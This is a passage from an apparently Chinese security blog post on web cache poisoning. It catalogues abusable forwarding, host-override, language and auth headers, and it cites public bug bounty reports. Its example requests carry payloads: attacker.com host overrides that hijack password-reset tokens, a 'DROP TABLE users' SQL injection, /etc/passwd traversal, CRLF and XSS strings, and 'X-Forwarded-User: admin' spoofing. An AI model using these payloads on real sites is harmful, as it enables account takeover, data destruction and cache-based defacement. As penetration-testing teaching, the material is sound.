+<p><strong>真实案例</strong>：类似的路径操纵技术详见 <a target="_blank" rel="noopener" href="https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/">Snyk 关于开源包中缓存投毒的研究</a>，在 Flask、Bottle 和其他流行框架中发现了漏洞。</p>
+<h2 id="三-Host-操纵-Header"><a href="#三-Host-操纵-Header" class="headerlink" title="三. Host 操纵 Header"></a>三. Host 操纵 Header</h2><h3 id="X-Host：替代-Host"><a href="#X-Host：替代-Host" class="headerlink" title="X-Host：替代 Host"></a>X-Host：替代 Host</h3><p>当 <code>X-Forwarded-Host</code> 被阻止时，<code>X-Host</code> 经常能悄无声息地通过。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>支持 X-Host 的框架：</strong></p>
+<ul>
+<li>Symfony（带信任代理配置）</li>
+<li>Laravel（在受信任代理后面）</li>
+<li>Django（带 SECURE_PROXY_SSL_HEADER）</li>
+<li>Flask（带 ProxyFix 中间件）</li>
+</ul>
+<p><strong>攻击场景：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/password-reset</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Host</span><span class="hljs-punctuation">: </span>attacker.com<br></code></pre></td></tr></table></figure>
+
+<p>密码重置邮件包含：<code>https://attacker.com/reset?token=SECRET</code></p>
+<h3 id="X-Forwarded-Server：主机名覆盖"><a href="#X-Forwarded-Server：主机名覆盖" class="headerlink" title="X-Forwarded-Server：主机名覆盖"></a>X-Forwarded-Server：主机名覆盖</h3><p>此 Header 指定原始服务器主机名。应用有时将其用于日志记录或 URL 生成。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Server</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p>如果应用将其用于日志记录且日志可访问（通过 SSRF、路径遍历等），你就注入了日志。这可以实现：</p>
+<ul>
+<li>日志注入攻击</li>
+<li>日志系统中的 CRLF 注入</li>
+<li>如果日志在管理面板中显示，可实现二阶 XSS</li>
+</ul>
+<p><strong>日志注入测试：</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">X-Forwarded-<span class="hljs-keyword">Server</span>: evil.com\n[ERROR] <span class="hljs-keyword">Admin</span> <span class="hljs-keyword">password</span>: dumped<br></code></pre></td></tr></table></figure>
+
+<h3 id="X-HTTP-Host-Override：框架特定-Header"><a href="#X-HTTP-Host-Override：框架特定-Header" class="headerlink" title="X-HTTP-Host-Override：框架特定 Header"></a>X-HTTP-Host-Override：框架特定 Header</h3><p>某些框架使用自定义 Header 进行 Host 覆盖：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-HTTP-Host-Override</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>要测试的框架特定 Header：</strong></p>
+<ul>
+<li><code>X-HTTP-Host-Override</code>（通用中间件）</li>
+<li><code>X-ProxyUser-Ip</code>（IBM WebSphere）</li>
+<li><code>X-Forwarded-By</code>（自定义实现）</li>
+<li><code>X-Backend-Server</code>（负载均衡器特定）</li>
+<li><code>X-Server-Name</code>（Apache mod_proxy）</li>
+</ul>
+<p>开发者实现自定义代理逻辑时没有进行适当验证。</p>
+<h2 id="四-Content操纵-Header"><a href="#四-Content操纵-Header" class="headerlink" title="四. Content操纵 Header"></a>四. Content操纵 Header</h2><h3 id="X-Content-Type-Options：MIME-混淆"><a href="#X-Content-Type-Options：MIME-混淆" class="headerlink" title="X-Content-Type-Options：MIME 混淆"></a>X-Content-Type-Options：MIME 混淆</h3><p>虽然不能直接注入，但操纵它可以增强缓存投毒的影响。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/user.json</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Content-Type-Options</span><span class="hljs-punctuation">: </span>nosniff<br></code></pre></td></tr></table></figure>
+
+<p><strong>影响：</strong></p>
+<ul>
+<li>强制严格 MIME 类型检查</li>
+<li>可以破坏依赖 MIME 嗅探的应用</li>
+<li>结合缓存投毒，可以破坏整个站点</li>
+</ul>
+<h3 id="Accept-Encoding：压缩混淆"><a href="#Accept-Encoding：压缩混淆" class="headerlink" title="Accept-Encoding：压缩混淆"></a>Accept-Encoding：压缩混淆</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, evil<br></code></pre></td></tr></table></figure>
+
+<p><strong>测试方向：</strong></p>
+<ul>
+<li>响应中的编码反射</li>
+<li>基于编码的缓存键变体</li>
+<li>不同编码的不同缓存桶</li>
+</ul>
+<p><strong>真实攻击模式：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"># 请求 1（投毒）：<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br><br># 请求 2（受害者）：<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br>（获得有毒响应）<br><br># 请求 3（受害者）：<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>deflate<br>（获得干净响应 — 不同的缓存键！）<br></code></pre></td></tr></table></figure>
+
+<p><strong>进阶</strong>：某些缓存规范化 <code>Accept-Encoding</code>，其他则不这样做。这创造了选择性投毒机会。了解更多请阅读 <a target="_blank" rel="noopener" href="https://portswigger.net/research/gotta-cache-em-all">PortSwigger 的 “Gotta Cache ‘Em All”</a> 研究论文。</p>
+<h2 id="五-本地化-Header"><a href="#五-本地化-Header" class="headerlink" title="五. 本地化 Header"></a>五. 本地化 Header</h2><h3 id="Accept-Language："><a href="#Accept-Language：" class="headerlink" title="Accept-Language："></a>Accept-Language：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击策略：</strong></p>
+<ul>
+<li>投毒特定语言缓存</li>
+<li>英语用户获得干净缓存</li>
+<li>西班牙语用户获得有毒缓存</li>
+<li>更难检测和复现</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1424094">Glassdoor 的 Web 缓存投毒报告 #1424094</a> 展示了特定语言的缓存如何导致跨不同页面的 CSRF Token 泄露和 XSS。</p>
+<h3 id="X-Forwarded-Language：自定义语言"><a href="#X-Forwarded-Language：自定义语言" class="headerlink" title="X-Forwarded-Language：自定义语言"></a>X-Forwarded-Language：自定义语言</h3><p>某些应用使用自定义 Header 进行语言选择：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">X<span class="hljs-operator">-</span>Forwarded<span class="hljs-operator">-</span><span class="hljs-keyword">Language</span>: en; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>测试方向：</strong></p>
+<ul>
+<li>语言参数中的 SQL 注入</li>
+<li>特定语言内容中的 XSS</li>
+<li>路径遍历：<code>X-Forwarded-Language: ../../../../etc/passwd</code></li>
+</ul>
+<h2 id="六-移动设备-Header"><a href="#六-移动设备-Header" class="headerlink" title="六. 移动设备 Header"></a>六. 移动设备 Header</h2><h3 id="X-Forwarded-Device：移动端"><a href="#X-Forwarded-Device：移动端" class="headerlink" title="X-Forwarded-Device：移动端"></a>X-Forwarded-Device：移动端</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Device</span><span class="hljs-punctuation">: </span>mobile<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (iPhone...)<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>移动缓存是独立的</li>
+<li>移动端点监控较少</li>
+<li>移动端不同的 CSP 策略</li>
+<li>移动端不同的 URL 资源</li>
+</ul>
+<h3 id="X-Requested-With：AJAX-缓存投毒"><a href="#X-Requested-With：AJAX-缓存投毒" class="headerlink" title="X-Requested-With：AJAX 缓存投毒"></a>X-Requested-With：AJAX 缓存投毒</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/endpoint</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>影响：</strong></p>
+<ul>
+<li>API 响应被投毒</li>
+<li>JavaScript 应用崩溃</li>
+<li>CORS 错误级联</li>
+<li>静默失败难以调试</li>
+</ul>
+<p><strong>额外攻击：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">X-Requested-With: <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>如果反射到响应 Header 或 CORS 检查中，那就是 XSS。</p>
+<h2 id="七-认证-Header"><a href="#七-认证-Header" class="headerlink" title="七. 认证 Header"></a>七. 认证 Header</h2><h3 id="X-Forwarded-User：用户欺骗"><a href="#X-Forwarded-User：用户欺骗" class="headerlink" title="X-Forwarded-User：用户欺骗"></a>X-Forwarded-User：用户欺骗</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/profile</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-User</span><span class="hljs-punctuation">: </span>admin<br></code></pre></td></tr></table></figure>
+
+<p>如果被信任：</p>
+<ul>
+<li>访问其他用户的个人资料</li>
+<li>提升权限</li>
+<li>为普通用户缓存管理员响应</li>
+</ul>
+<h3 id="X-Auth-Token：Token-注入"><a href="#X-Auth-Token：Token-注入" class="headerlink" title="X-Auth-Token：Token 注入"></a>X-Auth-Token：Token 注入</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Auth-Token</span><span class="hljs-punctuation">: </span>victim_token_here<br></code></pre></td></tr></table></figure>
+
+<p><strong>测试方向：</strong></p>
+<ul>
+<li>响应中的 Token 反射</li>
+<li>通过缓存的 Token 泄露</li>
+<li>Token 验证绕过</li>
+</ul>
+<h2 id="八-CloudFront-特定-Header"><a href="#八-CloudFront-特定-Header" class="headerlink" title="八. CloudFront 特定 Header"></a>八. CloudFront 特定 Header</h2><h3 id="CloudFront-Forwarded-Proto：AWS-特定攻击"><a href="#CloudFront-Forwarded-Proto：AWS-特定攻击" class="headerlink" title="CloudFront-Forwarded-Proto：AWS 特定攻击"></a>CloudFront-Forwarded-Proto：AWS 特定攻击</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">CloudFront-Forwarded-Proto</span><span class="hljs-punctuation">: </span>http<br></code></pre></td></tr></table></figure>
+
+<p>类似于 <code>X-Forwarded-Proto</code>，但专用于 AWS CloudFront。</p>
+<h3 id="CloudFront-Viewer-Country：地理定向绕过"><a href="#CloudFront-Viewer-Country：地理定向绕过" class="headerlink" title="CloudFront-Viewer-Country：地理定向绕过"></a>CloudFront-Viewer-Country：地理定向绕过</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">CloudFront-Viewer-<span class="hljs-built_in">Count</span><span class="hljs-symbol">ry:</span> US<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击：</strong></p>
+<ul>
+<li>绕过地理限制</li>
+<li>投毒特定国家缓存</li>
+<li>访问地区锁定内容</li>
+</ul>
+<h2 id="九-自定义应用-Header"><a href="#九-自定义应用-Header" class="headerlink" title="九. 自定义应用 Header"></a>九. 自定义应用 Header</h2><h3 id="框架特定-Header"><a href="#框架特定-Header" class="headerlink" title="框架特定 Header"></a>框架特定 Header</h3><p>每个主要框架都有开发者未意识到可被利用的 Header：</p>
+<p><strong>Laravel：</strong></p>
+<ul>
+<li><code>X-CSRF-Token</code>（可导致缓存）</li>
+<li><code>X-Socket-ID</code>（WebSocket 混淆）</li>
+</ul>
+<p><strong>Django：</strong></p>
+<ul>
+<li><code>X-CSRFToken</code>（可导致缓存）</li>
+<li><code>X-Forwarded-Protocol</code>（协议覆盖）</li>
+</ul>
+<p><strong>Express.js：</strong></p>
+<ul>
+<li><code>X-Forwarded-*</code>（取决于信任代理配置）</li>
+</ul>
+<p><strong>Spring Boot：</strong></p>
+<ul>
+<li><code>X-Forwarded-Prefix</code>（路径操纵）</li>
+<li><code>X-Forwarded-Context</code>（上下文覆盖）</li>
+</ul>
+<p><strong>Ruby on Rails</strong>：根据 <a target="_blank" rel="noopener" href="https://youst.in/posts/cache-poisoning-at-scale/">Youstin 的研究</a>，Rails 应用通常采用 <code>X-Forwarded-Scheme</code>，使其容易受到重定向循环 DoS 攻击。</p>
+<h2 id="十-高级-Header-链技术"><a href="#十-高级-Header-链技术" class="headerlink" title="十. 高级 Header 链技术"></a>十. 高级 Header 链技术</h2><h3 id="多-Header-投毒"><a href="#多-Header-投毒" class="headerlink" title="多 Header 投毒"></a>多 Header 投毒</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br><span class="hljs-attribute">X-Forwarded-Scheme</span><span class="hljs-punctuation">: </span>http<br><span class="hljs-attribute">X-Forwarded-Port</span><span class="hljs-punctuation">: </span>8080<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/admin<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：<code>http://evil.com:8080/admin</code></p>
+<p>每个 Header 单独通过验证，但组合起来绕过 WAF 逻辑。</p>
+<p><strong>真实案例</strong>：James Kettle 在 <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-18/speakers/James-Kettle.html">Black Hat 2018</a> 的演讲演示了链接多个 Header 如何绕过会阻止单 Header 攻击的安全控制。</p>
+<h3 id="通过编码的-Header-走私"><a href="#通过编码的-Header-走私" class="headerlink" title="通过编码的 Header 走私"></a>通过编码的 Header 走私</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>target.com%0d%0aX-Injected-Header: evil<br></code></pre></td></tr></table></figure>
+
+<p><strong>测试方向：</strong></p>
+<ul>
+<li>URL 编码：<code>%0d%0a</code></li>
+<li>Unicode 编码：<code>\u000d\u000a</code></li>
+<li>UTF-8 BOM：<code>\xef\xbb\xbf</code></li>
+<li>制表符：<code>\t</code></li>
+</ul>
+<h2 id="十一-已获得赏金的Header-组合"><a href="#十一-已获得赏金的Header-组合" class="headerlink" title="十一. 已获得赏金的Header 组合"></a>十一. 已获得赏金的Header 组合</h2><h3 id="组合-1：Mozilla-Firefox-Shield-攻击"><a href="#组合-1：Mozilla-Firefox-Shield-攻击" class="headerlink" title="组合 1：Mozilla Firefox Shield 攻击"></a>组合 1：Mozilla Firefox Shield 攻击</h3><p><strong>研究者</strong>：James Kettle<br><strong>目标</strong>：Mozilla Firefox Shield<br><strong>使用的 Header：</strong></p>
+<ul>
+<li><code>X-Forwarded-Host: attacker-controlled.com</code></li>
+<li><code>Origin: null</code></li>
+</ul>
+<p><strong>影响</strong>：可能强制全球 5000 万 Firefox 浏览器安装有漏洞的扩展<br><strong>赏金</strong>：$1,000（24 小时内修复）<br><strong>来源</strong>：<a target="_blank" rel="noopener" href="https://portswigger.net/research/practical-web-cache-poisoning">PortSwigger Research</a></p>
+<h3 id="组合-2：HackerOne-DoS-攻击"><a href="#组合-2：HackerOne-DoS-攻击" class="headerlink" title="组合 2：HackerOne DoS 攻击"></a>组合 2：HackerOne DoS 攻击</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/409370">#409370</a><br><strong>使用的 Header：</strong></p>
+<ul>
+<li><code>X-Forwarded-Port: 123</code></li>
+<li><code>X-Forwarded-Host: evil.com</code></li>
+</ul>
+<p><strong>影响</strong>：HackerOne 重定向的持久性 DoS<br><strong>赏金</strong>：已公开披露</p>
+<h3 id="组合-3：Data-gov-篡改"><a href="#组合-3：Data-gov-篡改" class="headerlink" title="组合 3：Data.gov 篡改"></a>组合 3：Data.gov 篡改</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/303730">#303730</a><br><strong>使用的 Header：</strong></p>
+<ul>
+<li><code>X-Forwarded-Host: evil.com</code></li>
+</ul>
+<p><strong>影响</strong>：catalog.data.gov 的 XSS 和篡改<br><strong>发现</strong>：服务器未经验证信任 <code>X-Forwarded-Host</code> Header</p>
+<h3 id="组合-4：Acronis-缓存投毒"><a href="#组合-4：Acronis-缓存投毒" class="headerlink" title="组合 4：Acronis 缓存投毒"></a>组合 4：Acronis 缓存投毒</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1010858">#1010858</a><br><strong>使用的 Header：</strong></p>
+<ul>
+<li><code>X-Forwarded-Port: 0</code></li>
+</ul>
+<p><strong>影响</strong>：可以用恶意响应破坏缓存<br><strong>模式</strong>：端口操纵破坏 URL 生成</p>
+<h3 id="组合-5：Shopify-路径混淆"><a href="#组合-5：Shopify-路径混淆" class="headerlink" title="组合 5：Shopify 路径混淆"></a>组合 5：Shopify 路径混淆</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1695604">#1695604</a><br><strong>攻击向量</strong>：反斜杠 vs 正斜杠差异<br><strong>影响</strong>：通过缓存投毒造成 DoS<br><strong>洞察</strong>：CDN 将 <code>\</code> 和 <code>/</code> 视为等效，而源服务器返回 404</p>
+<h2 id="十二-Header-测试清单"><a href="#十二-Header-测试清单" class="headerlink" title="十二. Header 测试清单"></a>十二. Header 测试清单</h2><h3 id="转发-Header："><a href="#转发-Header：" class="headerlink" title="转发 Header："></a>转发 Header：</h3><ul>
+<li><input disabled="" type="checkbox"> X-Forwarded-Host</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-For</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Proto</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Scheme</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Port</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Server</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Prefix</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Uri</li>
+<li><input disabled="" type="checkbox"> Forwarded（RFC 7239）</li>
+</ul>
+<h3 id="Host-覆盖-Header："><a href="#Host-覆盖-Header：" class="headerlink" title="Host 覆盖 Header："></a>Host 覆盖 Header：</h3><ul>
+<li><input disabled="" type="checkbox"> X-Host</li>
+<li><input disabled="" type="checkbox"> X-HTTP-Host-Override</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-By</li>
+<li><input disabled="" type="checkbox"> X-Backend-Server</li>
+<li><input disabled="" type="checkbox"> X-Server-Name</li>
+</ul>
+<h3 id="URL-操纵："><a href="#URL-操纵：" class="headerlink" title="URL 操纵："></a>URL 操纵：</h3><ul>
+<li><input disabled="" type="checkbox"> X-Original-URL</li>
+<li><input disabled="" type="checkbox"> X-Rewrite-URL</li>
+<li><input disabled="" type="checkbox"> X-Original-Path</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Path</li>
+</ul>
+<h3 id="协议和方案："><a href="#协议和方案：" class="headerlink" title="协议和方案："></a>协议和方案：</h3><ul>
+<li><input disabled="" type="checkbox"> X-Forwarded-Protocol</li>
+<li><input disabled="" type="checkbox"> X-Url-Scheme</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Ssl（on&#x2F;off）</li>
+<li><input disabled="" type="checkbox"> CloudFront-Forwarded-Proto</li>
+</ul>
+<h3 id="内容和设备："><a href="#内容和设备：" class="headerlink" title="内容和设备："></a>内容和设备：</h3><ul>
+<li><input disabled="" type="checkbox"> X-Forwarded-Device</li>
+<li><input disabled="" type="checkbox"> X-Content-Type-Options</li>
+<li><input disabled="" type="checkbox"> X-Requested-With</li>
+<li><input disabled="" type="checkbox"> Accept-Encoding</li>
+<li><input disabled="" type="checkbox"> Accept-Language</li>
+</ul>
+<h3 id="认证和用户："><a href="#认证和用户：" class="headerlink" title="认证和用户："></a>认证和用户：</h3><ul>
+<li><input disabled="" type="checkbox"> X-Forwarded-User</li>
+<li><input disabled="" type="checkbox"> X-Auth-Token</li>
+<li><input disabled="" type="checkbox"> X-User-Id</li>
+<li><input disabled="" type="checkbox"> X-Remote-User</li>
+</ul>
+<h3 id="框架特定："><a href="#框架特定：" class="headerlink" title="框架特定："></a>框架特定：</h3><ul>
+<li><input disabled="" type="checkbox"> X-CSRF-Token</li>
+<li><input disabled="" type="checkbox"> X-Socket-ID</li>
+<li><input disabled="" type="checkbox"> X-Forwarded-Context</li>
+<li><input disabled="" type="checkbox"> X-ProxyUser-Ip</li>
+</ul>
+<h3 id="优先测试的-Top-10-Header："><a href="#优先测试的-Top-10-Header：" class="headerlink" title="优先测试的 Top 10 Header："></a>优先测试的 Top 10 Header：</h3><ol>
+<li>X-Forwarded-Host</li>
+<li>X-Forwarded-Scheme</li>
+<li>X-Original-URL</li>
+<li>X-Rewrite-URL</li>
+<li>X-Host</li>
+<li>X-Forwarded-Server</li>
+<li>X-HTTP-Host-Override</li>
+<li>Forwarded</li>
+<li>X-Forwarded-Prefix</li>
+<li>X-Original-Path</li>
+</ol>
+<h3 id="CDN-检索表："><a href="#CDN-检索表：" class="headerlink" title="CDN 检索表："></a>CDN 检索表：</h3><ul>
+<li><strong>Cloudflare</strong>：<code>cf-cache-status</code>、<code>cf-ray</code> Header</li>
+<li><strong>Fastly</strong>：<code>X-Served-By</code>、<code>X-Cache</code> Header</li>
+<li><strong>Akamai</strong>：<code>X-Akamai-*</code>、<code>X-Cache</code> Header</li>
+<li><strong>CloudFront</strong>：<code>X-Cache</code>、<code>X-Amz-Cf-Id</code> Header</li>
+<li><strong>Varnish</strong>：<code>X-Varnish</code>、<code>Via</code> Header</li>
+</ul>
+<h3 id="缓存状态含义："><a href="#缓存状态含义：" class="headerlink" title="缓存状态含义："></a>缓存状态含义：</h3><ul>
+<li><strong>HIT</strong>：从缓存提供响应 ✅</li>
+<li><strong>MISS</strong>：来自源服务器，现已缓存</li>
+<li><strong>EXPIRED</strong>：缓存已过期，正在重新验证</li>
+<li><strong>STALE</strong>：重新验证期间提供过期内容</li>
+<li><strong>BYPASS</strong>：请求绕过了缓存</li>
+<li><strong>DYNAMIC</strong>：有意不缓存</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/" class="print-no-link">#缓存投毒</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>缓存投毒 - 1</div>
+      <div>https://xiaobite-hacker.github.io/2026/05/02/缓存投毒-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaobite</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年5月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/05/02/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-2/" title="缓存投毒 - 2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">缓存投毒 - 2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/05/01/%E7%9C%9F%E5%AE%9ESSRF%E6%BC%8F%E6%B4%9E%EF%BC%9AIPv6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91%E7%9A%84%E5%88%A9%E7%94%A8/" title="真实SSRF漏洞：IPv6与重定向的利用">
+                        <span class="hidden-mobile">真实SSRF漏洞：IPv6与重定向的利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
